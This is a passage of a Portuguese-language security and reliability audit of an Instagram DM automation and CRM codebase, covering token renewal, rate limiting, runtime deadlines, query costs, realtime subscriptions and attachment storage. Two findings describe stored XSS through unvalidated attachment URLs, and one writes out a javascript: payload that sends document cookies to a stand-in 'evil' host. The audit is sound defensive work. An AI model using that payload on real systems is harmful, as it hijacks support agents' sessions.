**O que é:** (1) Se a Meta responder sem `expires_in` (callback/route.ts:104-106 e token.ts:47-49 gravam `token_expires_at: null`), `getFreshToken` cai em `if (!expiresAt || ...) return token` e nunca mais tenta renovar: o token morre em ~60 dias e a conta vira 'expired'. (2) Dentro da janela de 15 dias, cada evento da Meta (DM, comentário, tick do cron) chama `refreshLongLivedToken` de novo enquanto a renovação falhar (rede, 400 por token com menos de 24h): um round-trip extra à Meta por evento, em série, dentro do tempo do webhook; e dois webhooks simultâneos renovam em paralelo (último UPDATE vence; comportamento do token anterior após ig_refresh_token é a confirmar na doc). (3) `parseGraphResponse` não distingue limite de taxa (códigos 4/17/32/613 ou HTTP 429) de erro definitivo e não há retry com backoff: um pico de comentários faz todas as interações caírem em 'error' de uma vez.

**Como acontece:** Conta com `token_expires_at` nulo: bot funciona 60 dias e depois para com 'Token expirado', sem aviso prévio. Pico de tráfego: Meta devolve 'Application request limit reached', o Falow registra erro e não reenvia; o lead fica sem resposta.

**Evidência:** token.ts:37 `if (!expiresAt || expiresAt - Date.now() > TOKEN_REFRESH_THRESHOLD_MS) return token;`; token.ts:41-59 try/refresh sem registrar última tentativa; graph.ts:25-40 sem tratamento de 429/backoff

**Recomendação:** Tratar `expires_in` ausente como 'renovar logo' (ex.: gravar agora + 59 dias) em vez de nulo. Guardar `token_refresh_attempted_at` e não tentar mais que 1x por hora por conta; fazer a renovação no cron (fora do caminho do webhook) e manter o webhook só lendo. Em graph.ts, reconhecer rate limit (HTTP 429, códigos 4/17/32/613) e aplicar 1-2 retries com backoff curto ou reagendar via sequence_runs.

### A3-027 [low] Renovação do token: nunca roda com token_expires_at nulo, repete a cada envio quando falha, ignora erro do update e não tem trava contra corrida
`src/lib/meta/token.ts:37` · reliability · ⚠️ não verificado

**O que é:** Quatro fragilidades no getFreshToken: (1) se a Meta não devolver `expires_in` (na troca ou numa renovação), token_expires_at fica nulo e `!expiresAt` faz a função devolver o token sem nunca renovar; o token morre em ~60 dias e a conta vira `expired`, obrigando reconexão. (2) Quando a renovação falha (rede, 190, limite), nada é gravado: cada envio seguinte nos 15 dias da janela dispara outra chamada a refresh_access_token (com timeout de até 15s) antes de mandar a mensagem, aumentando latência no webhook e consumo de cota. (3) O `update` do token renovado não tem o `error` conferido: se falhar, o token novo é usado nesta chamada e o antigo continua no banco. (4) Dois webhooks concorrentes dentro da janela renovam ao mesmo tempo e gravam cada um o seu resultado (último vence); funciona hoje porque a Meta mantém os dois válidos, mas é uma chamada desperdiçada por conflito.

**Como acontece:** Conta com token perto de vencer e Meta instável: todo evento recebido paga 1 chamada extra à Graph (até 15s) antes de responder. Conta cuja troca inicial veio sem expires_in: nunca renova e expira silenciosamente em 60 dias.

**Evidência:** token.ts:33-38 `const expiresAt = account.token_expires_at ? ... : null; if (!expiresAt || ...) return token;`; token.ts:43-51 `await admin.from("ig_accounts").update({...}).eq("id", account.id)` sem checar o retorno; token.ts:53-59 catch só faz console.warn.

**Recomendação:** Tratar token_expires_at nulo como 'renovar já' (ou assumir 60 dias na gravação); gravar `token_refresh_attempted_at` e só tentar de novo depois de X horas; conferir o erro do update; opcionalmente fazer a renovação num cron diário (contas com expiração < 15 dias) em vez de dentro do caminho do webhook, com update condicional (`.eq("access_token_enc", antigo)`) para evitar dupla renovação.

### A3-020 [low] Seletor de publicações busca a mídia de todas as contas ativas a cada render, sem cache
`src/lib/rules/account-media.ts:42` · optimization · ⚠️ não verificado

**O que é:** withRecentMedia descriptografa o token e chama listRecentMedia para cada conta ativa, em paralelo, toda vez que /rules/nova/responder-comentario (page.tsx:33) ou /rules/[id]/editar renderiza. Não há cache nem carregamento sob demanda da conta selecionada: com N contas são N chamadas à Graph API (cada uma com paginação de mídia) por abertura da tela, inclusive quando o usuário só queria abrir e fechar.

**Como acontece:** Usuário com 5 contas abre a tela de nova automação de comentário repetidas vezes → 5 GETs /me/media por abertura, 5 decryptToken, e a tela só aparece depois da conta mais lenta responder (ou falhar por timeout).

**Evidência:** account-media.ts:30-42 `Promise.all(accounts.map(async (account) => { ... await listRecentMedia(decryptToken(account.access_token_enc)) ... }))` chamado em nova/responder-comentario/page.tsx:33 com todas as contas ativas.

**Recomendação:** Carregar a mídia só da conta selecionada (server action ou rota sob demanda com `unstable_cache`/KV por conta com TTL de alguns minutos) e renderizar a tela sem esperar a Graph API.

### A1-037 [low] Validação limita cada atraso a 23h, mas não a soma dos atrasos no caminho: fluxo válido no editor termina em window_expired
`src/lib/sequences/graph.ts:377` · bug · ⚠️ não verificado

**O que é:** validateNode só confere o nó de atraso isoladamente (`seconds > DELAY_MAX_SECONDS` = 23h, justificado como 'limite da janela de 24h'). Dois atrasos consecutivos (ou atraso + fila do cron, ver achado de throughput) ultrapassam a janela de 24h da Meta medida em ensureWindowOpen a partir de `conversations.last_inbound_at`. O runtime então lança WindowClosedError e o run termina como `window_expired` — comportamento correto para a Meta, mas o editor deixou salvar um fluxo que nunca consegue entregar a 2ª parte, e a pessoa fica travada pelo unique.

**Como acontece:** Workflow 'mensagem → Atraso 20h → mensagem → Atraso 20h → mensagem' salva sem erro. Na 2ª retomada (40h após a última DM da pessoa) ensureWindowOpen falha e o run vira window_expired; ninguém recebe a 3ª mensagem.

**Evidência:** graph.ts:44 `DELAY_MAX_SECONDS = 23 * 60 * 60`; :372-381 validação por nó; runtime.ts:1294-1313 ensureWindowOpen compara com `WINDOW_24H_MS - WINDOW_MARGIN_MS` a partir de last_inbound_at; :1235-1238 window_expired.

**Recomendação:** Na validação do grafo, somar os atrasos ao longo de cada caminho entre nós que exigem interação da pessoa (waitReply, quickReplies, collectInput, botões de ramificação) e bloquear (ou ao menos avisar) quando a soma passar de 23h; no editor, mostrar o total acumulado.

### A1-034 [low] Retomadas por resposta/botão ganham um orçamento novo de 40s por evento (deadline não é propagado), contrariando o controle de tempo único da invocação
`src/lib/sequences/runtime.ts:390` · bug · ⚠️ não verificado

**O que é:** handleSequenceReply e handleSequencePostback não recebem `deadline`; resumeFromHandle e handleCollectReply chamam executeFrom sem `deadline`, então runNodes:878 calcula `invocationDeadline()` = agora + 40s a cada retomada. O process.ts:159-161 diz que 'fluxos iniciados aqui não ganham um prazo novo a cada evento', mas isso só vale para maybeStartSequence/startSequenceFromRule. Um payload do webhook com vários eventos (entry.messaging[] em lote) de pessoas respondendo quick replies/botões executa cada retomada com 40s próprios, e o tick oportunista no fim ainda usa o deadline original (já vencido → não faz nada). Efeito colateral: o parkRun também perde os contextos `resendCollectErrorAt`/`followRecheckAt` (opts não são persistidos), mas como esses caminhos nunca estacionam (deadline fresco), isso hoje não ocorre — e passaria a ocorrer se o deadline fosse propagado sem persistir o contexto.

**Como acontece:** Webhook com 5 eventos de resposta no mesmo payload, cada um retomando um run com 2 mensagens (humanPause 2–3,5s + Graph): ~5 × 8s = 40s só nas retomadas, somados ao que já foi gasto; a invocação ultrapassa o tempo que a Meta tolera e, se for cancelada, o run em execução fica `running` até o recoverStaleRuns marcá-lo como erro.

**Evidência:** runtime.ts:390-397 assinatura de handleSequenceReply sem deadline; :502-507 idem handleSequencePostback; :604-610 `executeFrom(admin, account, sequence, run, nextNodeId)` sem opts.deadline; :476/482/485 executeFrom com `{ flow }` apenas; :878 `const deadline = opts.deadline ?? invocationDeadline();`; src/lib/meta/process.ts:273-279 e :809 chamam sem deadline.

**Recomendação:** Aceitar `deadline` em handleSequenceReply/handleSequencePostback e repassá-lo até executeFrom (como já é feito em maybeStartSequence). Ao estacionar (parkRun), persistir o contexto necessário em `variables` (ex.: `__resume: { collectError: nodeId }`) para a retomada reenviar o texto certo.

### A1-035 [low] Falha de leitura no banco é confundida com 'Sequência removida' / 'Conta desconectada' e encerra o run definitivamente; persistRun ignora erro de escrita
`src/lib/sequences/runtime.ts:571` · bug · ⚠️ não verificado

**O que é:** resumeFromHandle lê a sequência com `const { data } = ...` sem olhar `error`; se o Supabase falhar (timeout, pool esgotado, 5xx), `data` é null e o código persiste o run como `completed` com last_error 'Sequência removida' — o run já foi reivindicado (status running), então a pessoa perde o fluxo e não pode reentrar. O mesmo padrão em processDueRuns:705-717 (erro de leitura de ig_accounts vira 'Conta desconectada' e o run vai para `error`) e em persistRun:1277-1286, que não confere o erro do UPDATE: se a gravação de waiting_delay/waiting_reply falhar, o run fica `running` silenciosamente até o recoverStaleRuns marcá-lo como 'Execução interrompida', sem a causa real.

**Como acontece:** Pessoa toca num botão de ramificação durante uma instabilidade do Supabase: claimRunForSender funciona, a leitura da sequência falha, o run vira `completed`/'Sequência removida' e a ramificação nunca acontece. No painel aparece como concluído.

**Evidência:** runtime.ts:570-584 `const { data } = await admin.from('sequences')...; sequence = data; if (!sequence || !isLive(sequence)) { await persistRun(admin, run, 'completed', { last_error: stoppedReason(sequence) }); return null; }`; :705-717 `const { data: account } = ...; if (!account) { persistRun(..., 'error', { last_error: 'Conta desconectada' }) }`; :1277-1286 persistRun sem tratar o retorno do update.

**Recomendação:** Checar `error` nessas leituras e, em caso de falha, devolver o run ao status de espera anterior (ou lançar para o catch, que grava last_error com a mensagem real) em vez de concluir; em persistRun, logar/lançar quando o UPDATE falhar para que o catch registre a causa.

### A1-036 [low] 'Ir para workflow': erro no destino antes da 1ª mensagem some do painel de execuções (run atual vira completed, run do destino é apagado)
`src/lib/sequences/runtime.ts:1158` · bug · ⚠️ não verificado

**O que é:** startSequenceFromGoTo executa o destino com `discardRunIfNothingSent: true`. Se o primeiro envio do destino falhar (Graph API, token, janela), o run do destino é apagado e o outcome `{status: 'error'}` volta como `handoff` — que é truthy, então o run atual é persistido como `completed` e o erro só fica em `interactions`. O comentário do nó diz que 'destino pausado, vencido ou removido vira erro visível no painel de execuções', mas qualquer outra falha fica invisível nas execuções: nem o run de origem (completed) nem o destino (apagado) mostram o problema, e a pessoa fica sem continuação.

**Como acontece:** Workflow A termina em 'Ir para workflow B'; a 1ª mensagem de B recebe um erro da Meta. Resultado: run de A = completed, run de B inexistente, pessoa sem mensagem; o operador só descobre nos logs de interações.

**Evidência:** runtime.ts:1151-1164 `const handoff = await startSequenceFromGoTo(...); if (!handoff) throw ...; await persistRun(admin, run, 'completed', { steps_executed: steps }); return handoff;`; :300-303 `executeFrom(..., { discardRunIfNothingSent: true, deadline })`; :1228-1233 apaga o run quando nada foi enviado.

**Recomendação:** Se `handoff.status === 'error'` (ou 'window_expired'), persistir o run atual como `error` com `last_error` = handoff.errorDetail em vez de `completed`; opcionalmente manter o run do destino como error quando a origem foi um go-to (não há risco de 'travar a pessoa' aqui, pois o unique do destino bloquearia a reentrada de qualquer forma).

### A1-039 [low] Sweep de expiração + recoverStaleRuns + select de vencidos rodam em TODO webhook e o tick faz 6 round-trips por run antes de executar
`src/lib/sequences/runtime.ts:631` · optimization · ⚠️ não verificado

**O que é:** Cada invocação do webhook (inclusive ecos, reações, 'visto', eventos que não interessam) executa expireAutomations (2 DELETE + 2 UPDATE), recoverStaleRuns (1 SELECT) e o SELECT de runs vencidos, ou seja, ≥6 consultas fixas mesmo quando nada venceu — e o cron já faz exatamente isso a cada minuto. Dentro do tick, cada run paga accountHasAccess (ig_accounts + access_grants + subscriptions), isTakenOver (conversations), claimRun e a busca de ig_accounts (N+1: 10 runs = ~60 consultas antes de enviar qualquer coisa), mais um SELECT em conversations (ensureWindowOpen) por bloco de envio dentro do mesmo run.

**Como acontece:** Pico de 300 webhooks/min (reações, seen, ecos do CRM) = ~1.800 consultas/min só de housekeeping redundante; no cron, 10 runs = ~60–80 consultas sequenciais que consomem o orçamento de 40s antes de qualquer envio (latência Supabase ~20–50ms cada), reduzindo ainda mais o throughput do achado de volume.

**Evidência:** src/lib/meta/process.ts:186-187 chama expireAutomationsSafe() e processDueRunsSafe(3) ao fim de todo payload; runtime.ts:631 `await recoverStaleRuns(admin)` em todo processDueRuns; :666 accountHasAccess (access.ts:115-127 → hasActiveAccess: 2 consultas extras); :684 isTakenOver; :693 claimRun; :705-710 busca de ig_accounts por run; :927/942/979/1046/1083 ensureWindowOpen por bloco.

**Recomendação:** Condicionar o tick/sweep do webhook (ex.: só quando o evento tocou um run, ou com um throttle 'última execução há > 30s' via KV/Durable Object) ou removê-lo; no tick, carregar em uma query os ig_accounts (com user_id) e as conversations (human_takeover_at, last_inbound_at) de todos os runs do lote, e cachear `last_inbound_at` dentro de runNodes (ele só muda com inbound, que não ocorre durante a execução).

### A2-024 [low] Verificação da chave de IA envia a chave ao provedor que o usuário selecionou, mesmo quando o prefixo mostra que é de outro
`src/modules/ai-settings/services/verify-key.ts:38` · security · ⚠️ não verificado

**O que é:** `verifyAiKey(provider, apiKey)` faz `fetch(KEY_ENDPOINTS[provider], { Authorization: Bearer <chave> })` sem conferir o formato da chave. Com 'OpenAI' selecionado no card e uma chave `sk-or-v1-...` (OpenRouter) colada por engano, a chave da OpenRouter vai para api.openai.com; o inverso também. O `inferProviderFromKey` (providers.ts:56) já sabe distinguir pelo prefixo, mas só é usado na leitura.

**Como acontece:** Usuário troca o seletor sem perceber e cola a chave: a chave válida de um provedor é transmitida a um terceiro (que a recebe num 401 logado do lado deles). Risco baixo e auto-infligido, mas evitável.

**Evidência:** verify-key.ts:38-41 `res = await fetchImpl(KEY_ENDPOINTS[provider], { headers: { Authorization: `Bearer ${apiKey}` } ...` sem checagem de prefixo

**Recomendação:** Antes do fetch, recusar quando `inferProviderFromKey(apiKey) !== provider` com uma mensagem clara ('Essa chave parece ser da OpenRouter; selecione OpenRouter'). Manter o keyHint com 4 caracteres (ok como está).

### A1-023 [low] Importação de histórico reabre conversas concluídas e gasta ~4 queries por mensagem importada
`src/modules/crm/capture/server/record.ts:124` · bug · ⚠️ não verificado

**O que é:** recordIncoming faz `update conversations set status='open'` para toda mensagem inbound gravada, inclusive com source='import'. importHistoryBatch (import-history.ts:74) chama recordIncoming por mensagem (até 20 por conversa): cada uma faz upsert em conversations (ensureConversation), insert em messages, select em message_signals_pending e o update de status. O upsert em conversations ainda dispara um evento Realtime UPDATE por mensagem.

**Como acontece:** Usuário marca 30 conversas como 'Concluídas', depois clica em 'Importar histórico de DMs': todas as conversas que tinham mensagens antigas do lead ainda não gravadas voltam para 'Abertas', embora nenhuma mensagem nova tenha chegado. Em contas com milhares de conversas, cada lote de 5 conversas faz ~400 round-trips ao Postgres dentro do Worker.

**Evidência:** record.ts:124-126 `if (draft.direction === "inbound") { await admin.from("conversations").update({ status: "open" }).eq("id", conversationId); }` sem checar source; import-history.ts:70-74 laço por mensagem.

**Recomendação:** Não reabrir quando source === 'import' (ou só se created_at > última leitura); na importação resolver a conversa uma vez por thread e inserir as mensagens em lote (`insert ... on conflict do nothing`).

### A2-039 [low] ensureConversation faz UPSERT com DO UPDATE em toda mensagem, disparando evento realtime de UPDATE em conversations sem mudança real
`src/modules/crm/capture/server/record.ts:68` · optimization · ⚠️ não verificado

**O que é:** `upsert({account_id, ig_sender_id}, {onConflict})` sem `ignoreDuplicates` vira `INSERT ... ON CONFLICT DO UPDATE SET account_id=…, ig_sender_id=…`, ou seja, um UPDATE físico da linha a cada chamada. É chamado em recordIncoming, recordOutbound e de novo em capture-event.ts:51. Como `conversations` está na publication `supabase_realtime` (0009:165-168), cada DM gera 2–3 eventos de UPDATE extras para todos os painéis abertos (que fazem `router.refresh`), além do trigger `messages_after_insert` que já atualiza a conversa.

**Como acontece:** 1 DM → upsert (UPDATE) + trigger UPDATE + update status + upsert de novo = 4 escritas na mesma linha e 4 eventos realtime; 1 envio de workflow com 5 mensagens → 5 UPDATEs extras.

**Evidência:** record.ts:68-72: `.upsert({ account_id: accountId, ig_sender_id: leadId }, { onConflict: "account_id,ig_sender_id" }).select("id").single()`

**Recomendação:** Usar `ignoreDuplicates: true` seguido de select do id quando necessário (ou RPC `insert ... on conflict do nothing returning id` com fallback de select), e passar o conversation_id adiante para não repetir a chamada.

### A3-023 [low] Importação de histórico grava mensagem a mensagem (4 round trips cada) e repete ensureConversation para a mesma conversa
`src/modules/crm/history-import/server/import-history.ts:70` · optimization · ⚠️ não verificado

**O que é:** Para cada uma das até 20 mensagens de cada conversa, `recordIncoming` faz upsert de conversations + insert em messages + select em message_signals_pending + (inbound) update de status. Um lote de 5 conversas = até 100 mensagens × 4 = 400 consultas sequenciais, com o upsert da mesma conversa repetido 20 vezes.

**Como acontece:** Importar 500 conversas → 100 lotes × 400 consultas = 40.000 consultas; cada lote leva ~15 s só de banco.

**Evidência:** import-history.ts:70-75: `for (const raw of rawMessages) { const draft = mapImportedMessage(...); await recordIncoming(admin, account.id, draft, "import"); ...}`; record.ts:112 `ensureConversation` dentro de recordIncoming.

**Recomendação:** Resolver a conversa uma vez por `conv`, inserir as 20 mensagens num único `insert` em lote com `onConflict` ignorando duplicatas (`upsert(rows, { ignoreDuplicates: true })`), e pular applyPendingSignals para `source = 'import'`.

### A1-029 [low] Importação de histórico sem controle de ritmo e com backfill de até 200 chamadas à Graph API numa única action
`src/modules/crm/history-import/services/history-import.actions.ts:55` · reliability · ⚠️ não verificado

**O que é:** importHistoryStep pode ser chamada em paralelo/loop por qualquer usuário (cada passo = 1 + 5 chamadas à Graph API); ao terminar chama backfillLeadProfiles(admin, accountId, 200) → até 200 chamadas à Graph API (5 por vez) dentro da mesma server action. A mensagem de erro bruta da Graph API é devolvida ao cliente (linha 73). Não há trava de 'importação em andamento' por conta.

**Como acontece:** Usuário abre duas abas e importa ao mesmo tempo, ou um script chama a action em loop: o token da conta bate no rate limit da Meta e as automações do bot passam a falhar (erro 4/613) durante a janela; a action com 200 chamadas pode passar do tempo do Worker e deixar perfis sem buscar.

**Evidência:** history-import.actions.ts:55 `await backfillLeadProfiles(admin, accountId, 200);` ; import-history-button.tsx:32-50 laço client-side sem trava no servidor.

**Recomendação:** Guardar estado da importação por conta (ex.: coluna import_cursor/import_started_at) para impedir execuções concorrentes; reduzir o backfill por passo (20-50) e deixar o restante para os próximos eventos; sanitizar a mensagem de erro.

### A2-035 [low] Falha da foto do lead dispara uma server action por avatar renderizado, sem agrupamento
`src/modules/crm/inbox/components/lead-avatar.tsx:62` · optimization · ⚠️ não verificado

**O que é:** Cada `<img>` de avatar que falha (URL da CDN da Meta expirada, o que acontece em massa porque todas expiram ao mesmo tempo) chama `refreshLeadPhoto(conversationId)`. A lista do Inbox tem até 60 conversas e a ficha/cabeçalho repetem o avatar: ao abrir o Inbox com as URLs vencidas, o navegador dispara dezenas de server actions em paralelo; cada uma faz 1 SELECT em `conversations` (lead-profile.actions.ts:21-27) e, se passou 1h, 1 SELECT em `ig_accounts` + 1 chamada à Graph API + 1 UPDATE. O UPDATE em `conversations` ainda dispara o Realtime, que chama `router.refresh()`, que re-renderiza a lista.

**Como acontece:** Custo real: rajada de 60+ actions e queries por abertura de Inbox após expiração das URLs, N chamadas à Graph API no mesmo instante (rate limit da Meta) e ciclo refresh → render → novas imagens → onError.

**Evidência:** lead-avatar.tsx:62-65 `onError={() => { setFailed(true); if (conversationId) void refreshLeadPhoto(conversationId).catch(() => {}); }}`; conversation-list.tsx:321-326 renderiza `LeadAvatar` com `conversationId` para cada item.

**Recomendação:** Decidir no servidor, ao montar a lista, se `ig_profile_fetched_at` está velho e agendar a atualização em lote (uma action com a lista de ids, ou job no cron), devolvendo a URL nova; no cliente, não chamar a action quando a URL ainda é recente.

### A1-017 [low] URLs de anexos/mídia renderizadas sem validar esquema (javascript:) nem host
`src/modules/crm/inbox/components/message-bubble.tsx:360` · security · ⚠️ não verificado

**O que é:** LinkOut usa `href={attachment.url}` e Media usa `src={url}` com o valor gravado em messages.attachments. O React não bloqueia `javascript:` em href. A URL vem do webhook (parse-event.ts:126 `a.payload?.url`), da importação (map-message.ts:26) ou do próprio envio (ver achado sobre sendMessage). O webhook confere assinatura (route.ts:32), então hoje o caminho externo depende de vazamento do APP_SECRET ou da própria Meta.

**Como acontece:** Com META_APP_SECRET vazado, um atacante forja um evento messaging com attachments[0].payload.url = 'javascript:fetch(...)'; o atendente clica em 'Arquivo' no Inbox e o script roda com a sessão dele (XSS armazenado). Também permite <img src> apontando para host do atacante (vazamento de IP do atendente; referrerPolicy já é no-referrer).

**Evidência:** message-bubble.tsx:360-361 `<a href={attachment.url} target="_blank" rel="noopener noreferrer"`; parse-event.ts:124-127 grava url sem validar.

**Recomendação:** Na gravação (parse-event/map-message/parse-sent) e na renderização, aceitar só URLs `https:` de hosts conhecidos (*.cdninstagram.com, *.fbcdn.net, lookaside.fbsbx.com, bucket próprio); descartar o resto (url: null → 'Mídia indisponível').

### A2-029 [low] URLs de anexo e mídia vindas do payload da Meta são renderizadas em href/src sem validar o protocolo
`src/modules/crm/inbox/components/message-bubble.tsx:361` · security · ⚠️ não verificado

**O que é:** `LinkOut` coloca `attachment.url` direto em `<a href>` (linha 361) e `Media` coloca a URL em `<img src>` (338), `<video src>` (330) e `<audio src>` (323); `meta.story.url` segue o mesmo caminho (252). Essas URLs vêm de `message.attachments[].payload.url` do webhook (src/modules/crm/capture/utils/parse-event.ts:124-127, sem validação) e da importação de histórico (src/modules/crm/history-import/utils/map-message.ts:25-27). Hoje a origem é a Meta, que gera URLs de CDN, então não há vetor direto por um seguidor; mas o React 18 ainda renderiza `href="javascript:..."` (só avisa no console), e não há CSP. Qualquer mudança futura no formato do payload, um webhook forjado que passe pela verificação de assinatura, ou dado gravado por outro caminho viraria XSS clicável na conversa. Mesmo raciocínio para `https://www.instagram.com/${c.ig_sender_username}/` em contact-panel.tsx:89 e lead-profile-dialog.tsx:89 (username interpolado sem `encodeURIComponent`).

**Como acontece:** Se um registro em `messages.attachments[0].url` contiver `javascript:fetch('https://evil/?c='+document.cookie)` (por payload inesperado da Meta, webhook forjado caso a validação HMAC falhe, ou escrita direta no banco), o atendente clica em "Publicação compartilhada" e o script roda com a sessão dele; os cookies do Supabase são legíveis por JS.

**Evidência:** message-bubble.tsx:360-363 `<a href={attachment.url} target="_blank" rel="noopener noreferrer">`; :338 `<img src={url}`; parse-event.ts:126 `url: a.payload?.url ?? null`.

**Recomendação:** Criar um helper `safeHttpUrl(url)` que só aceita `new URL(url).protocol` em {http:, https:} (idealmente também hostname em *.cdninstagram.com/*.fbcdn.net/instagram.com/supabase) e usá-lo em LinkOut/Media e nos links de perfil; aplicar a mesma validação ao gravar (parse-event.ts e map-message.ts) para não persistir URL com esquema estranho; `encodeURIComponent` no username.

### A1-024 [low] Realtime postgres_changes sem filtro em messages, conversations e leads: cada mudança de qualquer tenant é avaliada contra o RLS de cada painel aberto, e cada evento faz router.refresh
`src/modules/crm/inbox/hooks/use-inbox-realtime.ts:40` · optimization · ⚠️ não verificado

**O que é:** A 0009 adiciona messages e conversations (e a 0013 leads) à publication supabase_realtime, e os hooks use-inbox-realtime.ts:40-43 e use-pipeline-realtime.ts:36 assinam `postgres_changes` com `event: '*'` sem nenhum filtro. O isolamento entre clientes fica por conta do RLS (policies de select existem em messages 0009:150, conversations 0001:207 e leads 0013:123, então não há vazamento). Porém, no modelo postgres_changes do Supabase, cada linha alterada é checada contra as policies de RLS de CADA assinante conectado (o servidor Realtime executa a policy `account_id in (select id from ig_accounts where user_id = ...)` por assinante, por mudança): o custo cresce como (mensagens de todos os clientes) × (abas abertas de todos os clientes), e o payload entregue é a linha inteira de conversations (20+ colunas) só para disparar um router.refresh(), que re-renderiza a página inteira no servidor (listConversations + getThread ≈ 10 queries, mais o layout com getUnreadTotal). A documentação do Supabase recomenda Broadcast (ex.: `realtime.broadcast_changes` numa trigger, canais privados por conta) para escala multi-tenant.

**Como acontece:** Com M tenants recebendo DMs e K painéis abertos, cada insert em messages/conversations gera K avaliações de policy no Realtime, mesmo que só 1 assinante tenha direito ao evento; um cliente com tráfego alto faz o Realtime trabalhar para todos e, em pico de webhooks, o Realtime atrasa ou derruba assinaturas. Limites de conexões/mensagens do plano Supabase: a confirmar na configuração.

**Evidência:** use-inbox-realtime.ts:42-43 `.on("postgres_changes", { event: "*", schema: "public", table: "messages" }, refresh)` sem `filter`; use-pipeline-realtime.ts:36 idem para leads; 0009_crm_inbox.sql:156-171 adiciona as tabelas à publication.

**Recomendação:** Pelo menos filtrar a assinatura por conta (`filter: "account_id=eq.<id>"` / `account_id=in.(...)`, um canal por conta do usuário) para o Realtime descartar cedo; melhor, trocar para Broadcast com trigger `realtime.broadcast_changes` em canal privado `account:<id>` e policy em realtime.messages, removendo as tabelas da publication. Em vez de refresh total, atualizar só a lista/thread afetada.

### A1-016 [low] sendMessage aceita attachmentUrl e attachmentKind arbitrários vindos do cliente
`src/modules/crm/inbox/services/composer.actions.ts:116` · security · ⚠️ não verificado

**O que é:** A action não valida que `input.attachmentUrl` veio do upload do próprio usuário (bucket crm-uploads/<account_id>/...) nem que `attachmentKind` está em image|audio|video|file (o tipo é só TypeScript). O valor é mandado direto para a Meta em sendAttachmentMessage (graph.ts:203) e gravado em messages.attachments por parseSentMessage (parse-sent.ts:86), de onde é renderizado como <a href>/<img src> (message-bubble.tsx:338, 360).

**Como acontece:** Usuário logado chama sendMessage(conversationId, { attachmentUrl: 'https://qualquer.site/x', attachmentKind: 'template' }) ou com uma URL de outro cliente que conseguiu descobrir: a Meta baixa a URL arbitrária e entrega ao lead como se fosse do painel; a URL (inclusive `javascript:`) fica gravada e vira link clicável no próprio Inbox. Não cruza tenant, mas quebra a garantia de que só anexos subidos pelo painel saem pela conta.

**Evidência:** composer.actions.ts:115-116 `else if (input.attachmentUrl && input.attachmentKind) { await sendAttachmentMessage(token, conversation.ig_sender_id, input.attachmentKind, input.attachmentUrl, opts);`

**Recomendação:** Validar o input com zod: attachmentKind em enum, attachmentUrl https e com prefixo exato `${NEXT_PUBLIC_SUPABASE_URL}/storage/v1/object/public/crm-uploads/${conversation.account_id}/`; ou melhor, a action de upload devolver um id e sendMessage montar a URL no servidor.

### A1-018 [low] Bucket crm-uploads público e permanente: arquivo acessível por URL para sempre, sem expiração, sem limites por bucket, sem limpeza de anexos não enviados e sem checagem do conteúdo
`src/modules/crm/inbox/services/composer.actions.ts:157` · security · ⚠️ não verificado

**O que é:** A 0011 cria o bucket `crm-uploads` com `public = true` (necessário para a Meta baixar o anexo) e nenhuma policy em storage.objects (upload só pela service role em composer.actions.ts:160; listagem pública bloqueada por falta de policy, mas qualquer policy criada à mão no painel para anon em storage.objects permitiria listar os arquivos de todos os clientes — docs/operacao-saas.md seção 7 já pede a conferência manual). O anexo do atendente (foto, PDF, áudio) sobe com caminho <account_id>/<uuid>-<nome> e URL pública permanente (getPublicUrl). O upload acontece antes do envio (use-composer.ts:44-50): se sendMessage falhar ou nunca for chamado, o arquivo fica órfão e público; só o purge de usuário cancelado (api/cron/purge, 30 dias após o cancelamento) apaga a pasta `<account_id>/`. O content-type gravado confia em file.type/extensão do cliente (attachment-types.ts:31-44) sem olhar os bytes. O bucket não define `file_size_limit` nem `allowed_mime_types` (a confirmar na configuração): o único limite é o classifyUpload da server action (8MB imagem / 25MB PDF e áudio), que vale só para quem passa pela action. O nome do objeto tem UUID (não adivinhável), o que limita o risco a quem tem a URL.

**Como acontece:** Qualquer pessoa que receba/intercepte a URL (o lead, um print, logs de proxy) abre o PDF/áudio indefinidamente, mesmo depois de a conversa ser apagada do Falow. Um usuário pode subir bytes arbitrários nomeados .m4a e distribuí-los pela URL pública do Supabase como se fosse mídia da plataforma. Usuário logado chama uploadComposerAttachment repetidamente (25MB por chamada, sem cota nem rate limit) sem nunca enviar: custo de storage ilimitado por cliente, nunca limpo enquanto a assinatura existir.

**Evidência:** composer.actions.ts:157-167 grava `${account_id}/${randomUUID()}-${nome}` + getPublicUrl; 0011_crm_inbox_actions.sql:14-16 `insert into storage.buckets (id, name, public) values ('crm-uploads','crm-uploads', true)` sem policy em storage.objects; purge/route.ts:21-42 é a única remoção.

**Recomendação:** Bucket privado + createSignedUrl com TTL curto (a Meta baixa o arquivo na hora do envio); apagar o objeto após o envio bem-sucedido ou em job diário (no cron de purge) para objetos > 24h/N dias que não aparecem em messages.attachments; validar magic bytes (PNG/JPEG/PDF/WAV/M4A) antes de gravar; definir `file_size_limit` (25MB) e `allowed_mime_types` no bucket via migration (`update storage.buckets set ... where id='crm-uploads'`); conferir no painel que não existe policy select para anon/public em storage.objects.

### A1-031 [low] Upload de anexo bufferiza até 26 MB em memória no Worker
`src/modules/crm/inbox/services/composer.actions.ts:158` · reliability · ⚠️ não verificado

**O que é:** O arquivo inteiro passa pelo Worker (serverActions.bodySizeLimit 26mb em next.config.mjs:9) e é copiado para um Uint8Array antes de subir ao Storage. Workers da Cloudflare têm limite de 128 MB de memória por isolate.

**Como acontece:** Alguns atendentes (da mesma conta ou de contas diferentes atendidas pelo mesmo isolate) enviam PDFs de 20-25 MB ao mesmo tempo: o isolate passa do limite de memória e é reciclado, derrubando todas as requisições em voo (503) para quem estiver naquele isolate.

**Evidência:** composer.actions.ts:158 `const bytes = new Uint8Array(await file.arrayBuffer());`; next.config.mjs:9 `serverActions: { bodySizeLimit: "26mb" }`.

**Recomendação:** Upload direto do navegador para o Storage com URL assinada de upload (createSignedUploadUrl, com path fixado pelo servidor) e a action só valida/registra; reduzir o bodySizeLimit para o mínimo necessário.

### A2-031 [low] URL de anexo enviada pelo composer é aceita de qualquer origem (não é restrita ao bucket crm-uploads)
`src/modules/crm/inbox/services/composer.actions.ts:116` · security · ⚠️ não verificado

